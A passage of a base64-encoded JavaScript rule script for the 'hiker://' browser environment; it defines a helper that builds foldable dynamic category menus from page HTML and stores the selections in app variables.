Ot+WPluWxnuaAp+WAvFxcXFxuICAgICAgICAvLyDlnKjov5nph4zmiafooYzmgqjnmoTmk43kvZxcXFxcbiAgICAgICAgdGhpc1twcm9wZXJ0eV0gPSB2YWx1ZTtcXFxcbiAgICAgICAgaWYgKHRoaXMuZGVidWcpIHtcXFxcbiAgICAgICAgICBjb25zb2xlLmxvZyhwcm9wZXJ0eSArIFxcXFxcXFwiOlxcXFxcXFwiICsgdmFsdWUpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9KTtcXFxcbiAgICB9LFxcXFxuICAgIGV2YWxKU1J1bGUoaXRlbSwganNSdWxlKSB7XFxcXG4gICAgICBsZXQgcnVsZSA9IGpzUnVsZS5yZXBsYWNlKFxcXFxcXFwiQGpzOlxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgIHJ1bGUgPSBydWxlLnRyaW0oKTtcXFxcbiAgICAgIC8vbG9nKCQuc3RyaW5naWZ5KHJ1bGUpKVxcXFxuICAgICAgbGV0IGlucHV0ID0gaXRlbTtcXFxcbiAgICAgIGlmIChydWxlLnN0YXJ0c1dpdGgoXFxcXFxcXCIoXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIGV2YWwoXFxcXFxcXCJyZXN1bHQgPSBcXFxcXFxcIiArIHJ1bGUpO1xcXFxuICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgLyoqXFxcXG4gICAgICAgICAqIOi/mOWOn+aIkCAkLnRvU3RyaW5nKC4uLikg55qE5pyA57uI57uT5p6c77yM6L6+5Yiw5pyA57uI5aSE55CG5pa55byP6Lef5LiK6Z2i55qEIGlmIOS4gOiHtOeahOebrueahFxcXFxuICAgICAgICAgKi9cXFxcbiAgICAgICAgZXZhbChcXFxcXFxcInJlc3VsdCA9IFxcXFxcXFwiICsgXFxcXFxcXCIoKCkgPT4ge1xcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwifSkoKVxcXFxcXFwiKTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIHJldHVybiByZXN1bHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICB9LFxcXFxuICAgIGdldFRpdGxlKHNyYywgY2F0ZWdvcnkpIHtcXFxcbiAgICAgIGxldCB0aXRsZSA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICBsZXQgdGl0bGVSdWxlID0gY2F0ZWdvcnkgfHwgXFxcXFxcXCJhJiZUZXh0XFxcXFxcXCI7XFxcXG4gICAgICBpZiAodGl0bGVSdWxlLnN0YXJ0c1dpdGgoXFxcXFxcXCJAanM6XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIHRpdGxlID0gdGhpcy5ldmFsSlNSdWxlKHNyYywgdGl0bGVSdWxlKTtcXFxcbiAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHRpdGxlID0gcGFyc2VEb21Gb3JIdG1sKHNyYywgdGl0bGVSdWxlKTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIHJldHVybiB0aXRsZSB8fCBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0VXJsKHNyYywgY2F0ZWdvcnkpIHtcXFxcbiAgICAgIGxldCB1cmwgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgbGV0IHVybFJ1bGUgPSBjYXRlZ29yeS7pk77mjqUgfHwgXFxcXFxcXCJhJiZocmVmXFxcXFxcXCI7XFxcXG4gICAgICBpZiAodXJsUnVsZS5zdGFydHNXaXRoKFxcXFxcXFwiQGpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICB1cmwgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCB1cmxSdWxlKTtcXFxcbiAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHVybCA9IHBkKHNyYywgdXJsUnVsZSk7XFxcXG4gICAgICB9XFxcXG4gICAgICBpZiAodHlwZW9mIGNhdGVnb3J5LumTvuaOpeWkhOeQhiA9PSBcXFxcXFxcImZ1bmN0aW9uXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgdXJsID0gY2F0ZWdvcnku6ZO+5o6l5aSE55CGKHVybCk7XFxcXG4gICAgICB9XFxcXG4gICAgICByZXR1cm4gdXJsIHx8IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgfSxcXFxcbiAgICBpc051bGwocGFyYW0pIHtcXFxcbiAgICAgIGlmIChwYXJhbSA9PSBudWxsKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgICAgfVxcXFxuICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH0sXFxcXG4gICAgaXNCb29sZWFuKHZhcmlhYmxlKSB7XFxcXG4gICAgICBpZiAodHlwZW9mIHZhcmlhYmxlICE9PSBcXFxcXFxcImJvb2xlYW5cXFxcXFxcIikge1xcXFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLlvIDlkK/mipjlj6Dor7fkvKDlhaXluIPlsJTlgLxcXFxcXFxcIik7XFxcXG4gICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICDmuIXpmaQobGlzdCkge1xcXFxuICAgICAgaWYgKHRoaXMuaXNOdWxsKGxpc3QpKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgICAgfVxcXFxuICAgICAgaWYgKGxpc3QuY29uc3RydWN0b3IgPT0gU3RyaW5nKSB7XFxcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIua4hemZpOaKpemUmTror7fkvKDliJfooahcXFxcXFxcIik7XFxcXG4gICAgICB9XFxcXG4gICAgICB0aGlzLmNsZWFycyA9IGxpc3Q7XFxcXG4gICAgICByZXR1cm4gdGhpcztcXFxcbiAgICB9LFxcXFxuICAgIOWFqOa4hShsaXN0KSB7XFxcXG4gICAgICBpZiAodGhpcy5pc051bGwobGlzdCkpIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXM7XFxcXG4gICAgICB9XFxcXG4gICAgICB2YXIgYyA9IHRoaXMuY2xlYXJhbGw7XFxcXG4gICAgICBsaXN0ID0gYy5jb25jYXQobGlzdCk7XFxcXG4gICAgICB0aGlzLmNsZWFyYWxsID0gbGlzdDtcXFxcbiAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgIH0sXFxcXG4gICAg5rqQ56CBKGlucHV0KSB7XFxcXG4gICAgICB0aGlzLmh0bWwgPSBpbnB1dDtcXFxcbiAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgIH0sXFxcXG4gICAg55WM6Z2iKGlucHV0KSB7XFxcXG4gICAgICB0aGlzLmxheW91dCA9IGlucHV0O1xcXFxuICAgICAgcmV0dXJuIHRoaXM7XFxcXG4gICAgfSxcXFxcbiAgICDpobXnoIEoaW5wdXQpIHtcXFxcbiAgICAgIHRoaXMucGFnZSA9IGlucHV0O1xcXFxuICAgICAgcmV0dXJuIHRoaXM7XFxcXG4gICAgfSxcXFxcbiAgICDnirbmgIEoaW5wdXQpIHtcXFxcbiAgICAgIHRoaXMuc3RhdGUgPSBpbnB1dDtcXFxcbiAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgIH0sXFxcXG4gICAg5byA5ZCv5pCc57SiKCkge1xcXFxuICAgICAgdGhpcy5zZWFyY2ggPSB0cnVlO1xcXFxuICAgICAgcmV0dXJuIHRoaXM7XFxcXG4gICAgfSxcXFxcbiAgICDlvIDlkK/mipjlj6AoaW5wdXQpIHtcXFxcbiAgICAgIGlmIChpbnB1dCA9PSB1bmRlZmluZWQpIHtcXFxcbiAgICAgICAgaW5wdXQgPSB0cnVlO1xcXFxuICAgICAgfVxcXFxuICAgICAgdGhpcy5pc0Jvb2xlYW4oaW5wdXQpO1xcXFxuICAgICAgdGhpcy5vcGVuID0gaW5wdXQ7XFxcXG4gICAgICByZXR1cm4gdGhpcztcXFxcbiAgICB9LFxcXFxuICAgIHNldFRpdGxlKGssIGksIHQpIHtcXFxcbiAgICAgIHJldHVybiBrID09IGkgPyBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgdC5mb250Y29sb3IodGhpcy7liIbnsbvpopzoibIpIDogdDtcXFxcbiAgICB9LFxcXFxuICAgIGFjdGlvbihvYmopIHtcXFxcbiAgICAgIHJldHVybiBbXFxcXG4gICAgICAgIHtcXFxcbiAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuIXpmaTnirbmgIFcXFxcXFxcIixcXFxcbiAgICAgICAgICBqczogJC50b1N0cmluZygob2JqKSA9PiB7XFxcXG4gICAgICAgICAgICBsb2cob2JqKTtcXFxcbiAgICAgICAgICAgIGNsZWFyTXlWYXIob2JqLnN0YXRlKTtcXFxcbiAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJoZWFkLmNhdGVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBvYmouYWxsLmZvckVhY2goKGl0ZW0pID0+IHtcXFxcbiAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgb2JqLmNsLmZvckVhY2goKGl0ZW0pID0+IHtcXFxcbiAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICB9LCBvYmopLFxcXFxuICAgICAgICB9LFxcXFxuICAgICAgXTtcXFxcbiAgICB9LFxcXFxuICAgIGNoZWNrUGFyYW0oKSB7XFxcXG4gICAgICB2YXIgb2JqID0ge307XFxcXG4gICAgICBpZiAodGhpcy5wYWdlID09IDAgJiYgdHlwZW9mIHBhZ2UgPT0gXFxcXFxcXCJ1bmRlZmluZWRcXFxcXFxcIikge1xcXFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7fkvKDlhaXpobXnoIFcXFxcXFxcIik7XFxcXG4gICAgICB9IGVsc2Uge1xcXFxuICAgICAgICBpZiAodHlwZW9mIHBhZ2UgPT0gXFxcXFxcXCJ1bmRlZmluZWRcXFxcXFxcIikge1xcXFxuICAgICAgICAgIG9ialtcXFxcXFxcIumhteeggVxcXFxcXFwiXSA9IHRoaXMucGFnZTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICBvYmpbXFxcXFxcXCLpobXnoIFcXFxcXFxcIl0gPSBwYWdlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9XFxcXG4gICAgICBpZiAodGhpcy5odG1sID09IFxcXFxcXFwiZW1wdHlcXFxcXFxcIiAmJiB0eXBlb2YgaHRtbCA9PSBcXFxcXFxcInVuZGVmaW5lZFxcXFxcXFwiKSB7XFxcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuivt+S8oOWFpea6kOeggVxcXFxcXFwiKTtcXFxcbiAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIGlmICh0eXBlb2YgaHRtbCA9PSBcXFxcXFxcInVuZGVmaW5lZFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgb2JqW1xcXFxcXFwi5rqQ56CBXFxcXFxcXCJdID0gdGhpcy5odG1sO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgIG9ialtcXFxcXFxcIua6kOeggVxcXFxcXFwiXSA9IGh0bWw7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH1cXFxcbiAgICAgIGlmICh0aGlzLmxheW91dCA9PSBcXFxcXFxcInVuZGVmaW5lZFxcXFxcXFwiICYmIHR5cGVvZiBkID09IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+35Lyg5YWl55WM6Z2iXFxcXFxcXCIpO1xcXFxuICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBkID09IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICBvYmpbXFxcXFxcXCLnlYzpnaJcXFxcXFxcIl0gPSB0aGlzLmxheW91dDtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICBvYmpbXFxcXFxcXCLnlYzpnaJcXFxcXFxcIl0gPSBkO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9XFxcXG4gICAgICByZXR1cm4gb2JqO1xcXFxuICAgIH0sXFxcXG4gICAg5Yib5bu65Yqo5oCB5YiG57G7KHJ1bGVPYmopIHtcXFxcbiAgICAgIGlmIChydWxlT2JqID09IHVuZGVmaW5lZCkge1xcXFxuICAgICAgICBydWxlT2JqID0gW107XFxcXG4gICAgICB9XFxcXG4gICAgICAvL+WIneWni+WMluWPmOmHj+W8gOWni1xcXFxuICAgICAgY29uc3QgcGFyYW0gPSB0aGlzLmNoZWNrUGFyYW0oKTtcXFxcbiAgICAgIGNvbnN0IHBhZ2UgPSBwYXJhbS7pobXnoIE7XFxcXG4gICAgICBjb25zdCBodG1sID0gcGFyYW0u5rqQ56CBO1xcXFxuICAgICAgY29uc3QgZCA9IHBhcmFtLueVjOmdojtcXFxcbiAgICAgIGNvbnN0IOeKtuaAgSA9IHRoaXMuc3RhdGU7XFxcXG4gICAgICBjb25zdCBzZWFyY2ggPSB0aGlzLnNlYXJjaDtcXFxcbiAgICAgIGNvbnN0IGVtcHR5ID0gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICBjb25zdCDmipjlj6DnirbmgIEgPSB0aGlzLm9wZW47XFxcXG4gICAgICB2YXIg5bGV5byAID0gdGhpcy7lsZXlvIA7XFxcXG4gICAgICB2YXIg5oqY5Y+gID0gdGhpcy7mipjlj6A7XFxcXG4gICAgICB2YXIg5YWo5riFID0gdGhpcy5jbGVhcmFsbDtcXFxcbiAgICAgIHZhciDmuIXpmaQgPSB0aGlzLmNsZWFycztcXFxcbiAgICAgIC8v5Yid5aeL5YyW5Y+Y6YeP57uT5p2fXFxcXG4gICAgICBsZXQgaW5pdF9jYXRlID0gbmV3IEFycmF5KDIwKS5maWxsKFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgIGNvbnN0IGZvbGQgPSBnZXRNeVZhcihNWV9SVUxFLmdyb3VwLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICBjb25zdCBjYXRlX3RlbXAgPSBKU09OLnBhcnNlKFxcXFxuICAgICAgICBnZXRNeVZhcihcXFxcXFxcImhlYWQuY2F0ZVxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShpbml0X2NhdGUpKVxcXFxuICAgICAgKTtcXFxcbiAgICAgIGlmIChzZWFyY2ggJiYgcGFnZSA9PSAxKSB7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgdXJsOiBcXFxcXFxcIidoaWtlcjovL3NlYXJjaD9ydWxlPVxcXFxcXFwiICsgTVlfUlVMRS50aXRsZSArIFxcXFxcXFwiJnM9JytpbnB1dFxcXFxcXFwiLFxcXFxuICAgICAgICAgIGRlc2M6IFxcXFxcXFwi5pCc57Si5YWz6ZSu6K+NXFxcXFxcXCIsXFxcXG4gICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFxcXFxcImtleXdvcmRcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwia2V5d29yZFxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICB9LFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIGNvbnN0IGNhdGVnb3JpZXMgPSBbXTtcXFxcbiAgICAgIHJ1bGVPYmouZm9yRWFjaCgoeCkgPT4ge1xcXFxuICAgICAgICB2YXIgbGlzdCA9IFtdO1xcXFxuICAgICAgICBpZih4LuS4gOe6p+WumuS9jSl7XFxcXG4gICAgICAgICAgaWYgKHgu5LiA57qn5a6a5L2NLnN0YXJ0c1dpdGgoXFxcXFxcXCJAanM6XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgbGlzdCA9IHRoaXMuZXZhbEpTUnVsZShodG1sLCB4LuS4gOe6p+WumuS9jSk7XFxcXG4gICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgIGxpc3QgPSBwZGZhKGh0bWwsIHgu5LiA57qn5a6a5L2NKTtcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYoeC7lpKfnsbvlrprkvY0pe1xcXFxuICAgICAgICAgIGlmICh4LuWkp+exu+WumuS9jS5zdGFydHNXaXRoKFxcXFxcXFwiQGpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgIGxpc3QgPSB0aGlzLmV2YWxKU1J1bGUoaHRtbCwgeC7lpKfnsbvlrprkvY0pO1xcXFxuICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICBsaXN0ID0gW3BkZmEoaHRtbCwgeC7lpKfnsbvlrprkvY0pLmpvaW4oJ1xcXFxcXFxcbicpXTtcXFxcbiAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICB2YXIg5LiA57qnID0gbGlzdC5tYXAoKHMpID0+IHtcXFxcbiAgICAgICAgICB2YXIgc2xpc3QgPSBbXTtcXFxcbiAgICAgICAgICBpZiAoIShcXFxcXFxcIuWwj+exu1xcXFxcXFwiIGluIHgpKSB7XFxcXG4gICAgICAgICAgICB4LuWwj+exuyA9IFxcXFxcXFwiYm9keSYmYTpub3QoOm1hdGNoZXMo6aaW6aG1KSk6bm90KGE6bm90KFtocmVmXSkpXFxcXFxcXCI7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIGlmICh4LuWwj+exuy5zdGFydHNXaXRoKFxcXFxcXFwiQGpzOlxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgc2xpc3QgPSB0aGlzLmV2YWxKU1J1bGUocywgeC7lsI/nsbspO1xcXFxuICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICBzbGlzdCA9IHBkZmEocywgeC7lsI/nsbspO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICB2YXIg5a6a5L2NID0gc2xpc3QubWFwKChpdGVtKSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgdGl0bGUgPSB0aGlzLmdldFRpdGxlKGl0ZW0sIHgu5qCH6aKYKTtcXFxcbiAgICAgICAgICAgIHZhciB1cmwgPSB0aGlzLmdldFVybChpdGVtLCB4KTtcXFxcbiAgICAgICAgICAgIHZhciBvYmogPSB7IHRpdGxlOiB0aXRsZSwgdXJsOiB1cmwgfTtcXFxcbiAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShvYmopO1xcXFxuICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgIHJldHVybiDlrprkvY07XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICAvL2xvZyjkuIDnuqcpXFxcXG4gICAgICAgIC8vbG9nKOS4gOe6py5sZW5ndGgpXFxcXG4gICAgICAgIGlmICjkuIDnuqcubGVuZ3RoID09IDEpIHtcXFxcbiAgICAgICAgICBjYXRlZ29yaWVzLnB1c2go5LiA57qnLmpvaW4oXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIikpO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgIOS4gOe6py5mb3JFYWNoKChpdGVtKSA9PiB7XFxcXG4gICAgICAgICAgICBjYXRlZ29yaWVzLnB1c2goaXRlbS5qb2luKFxcXFxcXFwiLFxcXFxcXFwiKSk7XFxcXG4gICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgLy9sb2coY2F0ZWdvcmllcylcXFxcbiAgICAgIH0pO1xcXFxuICAgICAgaWYgKOaKmOWPoOeKtuaAgSkge1xcXFxuICAgICAgICBpZiAocGFnZSA9PSAxKSB7XFxcXG4gICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBmb2xkID09PSBcXFxcXFxcIjFcXFxcXFxcIiA/IOaKmOWPoCA6IOWxleW8gCxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKFxcXFxuICAgICAgICAgICAgICAoZm9sZCwgdSwgYWxsKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS5ncm91cCwgZm9sZCA9PT0gXFxcXFxcXCIxXFxcXFxcXCIgPyBcXFxcXFxcIjBcXFxcXFxcIiA6IFxcXFxcXFwiMVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAvKmFsbC5mb3JFYWNoKChpdGVtKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICBjbGVhck15VmFyKGl0ZW0pO1xcXFxuICAgICAgICAgICAgICAgIH0pOyovXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgZm9sZCxcXFxcbiAgICAgICAgICAgICAg54q25oCBLFxcXFxuICAgICAgICAgICAgICDlhajmuIVcXFxcbiAgICAgICAgICAgICksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICBsb25nQ2xpY2s6IHRoaXMuYWN0aW9uKHtcXFxcbiAgICAgICAgICAgICAgICBzdGF0ZTog54q25oCBLFxcXFxuICAgICAgICAgICAgICAgIGFsbDog5YWo5riFLFxcXFxuICAgICAgICAgICAgICAgIGNsOiDmuIXpmaQsXFxcXG4gICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfVxcXFxuICAgICAgaWYgKHBhZ2UgPT0gMSkge1xcXFxuICAgICAgY2F0ZWdvcmllcy5mb3JFYWNoKChjYXRlZ29yeSwgaW5kZXgpID0+IHtcXFxcbiAgICAgICAgLy9sb2coY2F0ZWdvcmllcylcXFxcbiAgICAgICAgbGV0IHN1Yl9jYXRlZ29yaWVzID0gW107XFxcXG4gICAgICAgIC8qaWYgKOWwj+exu+WumuS9jS5pbmNsdWRlcyhcXFxcXFxcIjtcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICBzdWJfY2F0ZWdvcmllcyA9IHBkZmEoY2F0ZWdvcnksIOWwj+exu+WumuS9jS5zcGxpdChcXFxcXFxcIjtcXFxcXFxcIilbMF0pO1xcXFxuICAgICAgICAgIGlmIChzdWJfY2F0ZWdvcmllcy5sZW5ndGggPT0gMCkge1xcXFxuICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMgPSBwZGZhKGNhdGVnb3J5LCDlsI/nsbvlrprkvY0uc3BsaXQoXFxcXFxcXCI7XFxcXFxcXCIpWzFdKTtcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0gZWxzZSB7Ki9cXFxcbiAgICAgICAgLy9sb2coaW5kZXgpXFxcXG4gICAgICAgIHN1Yl9jYXRlZ29yaWVzID0gSlNPTi5wYXJzZShgWyR7Y2F0ZWdvcnl9XWApO1xcXFxuICAgICAgICAvLyBzdWJfY2F0ZWdvcmllcyA9IHBkZmEoY2F0ZWdvcnksIOWwj+exu+WumuS9jSk7XFxcXG4gICAgICAgIC8vfVxcXFxuICAgICAgICBpZiAoaW5kZXggPT09IDApIHtcXFxcbiAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXFxcblxcXFxuICAgICAgICAgICAgLy9sZXQgdGl0bGUgPSBwZGZoKGl0ZW0sIF/lpKfnsbvmoIfpopgpO1xcXFxuICAgICAgICAgICAgbGV0IHRpdGxlID0gaXRlbS50aXRsZTtcXFxcbiAgICAgICAgICAgIGlmICh0eXBlb2Yg5o6S6ZmkICE9IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIgJiYg5o6S6ZmkICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgdGl0bGUgPSB0aXRsZS5yZXBsYWNlKG5ld1JlZ0V4cCjmjpLpmaQsIFxcXFxcXFwiZ1xcXFxcXFwiKSwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBsZXQganNvbj0nJ1xcXFxuICAgICAgICAgICAganNvbiA9IGl0ZW0udXJsO1xcXFxuICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICBsZXQgcGFyYW1zID0ge1xcXFxuICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXFxcbiAgICAgICAgICAgICAga2V5OiBrZXksXFxcXG4gICAgICAgICAgICAgIHBhZ2U6IHBhZ2UsXFxcXG4gICAgICAgICAgICAgIGNsZWFyczog5riF6ZmkLFxcXFxuICAgICAgICAgICAgICBqc29uOiBqc29uLFxcXFxuICAgICAgICAgICAgICBzdGF0ZTog54q25oCBLFxcXFxuICAgICAgICAgICAgICBhbGxjbGVhcnM6IOWFqOa4hSxcXFxcbiAgICAgICAgICAgIH07XFxcXG5cXFxcbiAgICAgICAgICAgIC8vbGV0IHVybCA9IHBkKGl0ZW0sIF/lpKfnsbvpk77mjqUpO1xcXFxuICAgICAgICAgICAgbGV0IHVybCA9IGl0ZW0udXJsO1xcXFxuICAgICAgICAgICAgLyppZiAo5aSn57G75aSE55CGKSB7XFxcXG4gICAgICAgICAgICAgIHVybCA9IOS4gOe6p+WIhuexu+WkhOeQhih1cmwpO1xcXFxuICAgICAgICAgICAgfSovXFxcXG4gICAgICAgICAgICAvL2xvZyh1cmwpXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICB0aXRsZTogdGhpcy5zZXRUaXRsZShrZXkudG9TdHJpbmcoKSwgY2F0ZV90ZW1wW2luZGV4XSwgdGl0bGUpLFxcXFxuICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgIHVybDogJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgocGFyYW1zKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IG5ld19jYXRlID0gW107XFxcXG4gICAgICAgICAgICAgICAgcGFyYW1zLmNsZWFycy5mb3JFYWNoKChpdGVtKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICBjbGVhck15VmFyKGl0ZW0pO1xcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIHBhcmFtcy5hbGxjbGVhcnMuZm9yRWFjaCgoaXRlbSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIHBhcmFtcy5jYXRlX3RlbXAuZm9yRWFjaCgoY2F0ZSwgaW5kZXgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgIG5ld19jYXRlLnB1c2goaW5kZXggPT09IDAgPyBwYXJhbXMua2V5LnRvU3RyaW5nKCkgOiBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJoZWFkLmNhdGVcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkobmV3X2NhdGUpKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW1zLmpzb24uY29uc3RydWN0b3IgPT09IE9iamVjdCkge1xcXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJkdF9cXFxcXFxcIiArIHBhcmFtcy5qc29uLnR5cGUsIHBhcmFtcy5qc29uLnZhbHVlKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLnN0YXRlLCBwYXJhbXMuanNvbik7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgfSwgcGFyYW1zKSxcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgIH0pO1xcXFxuICAgICA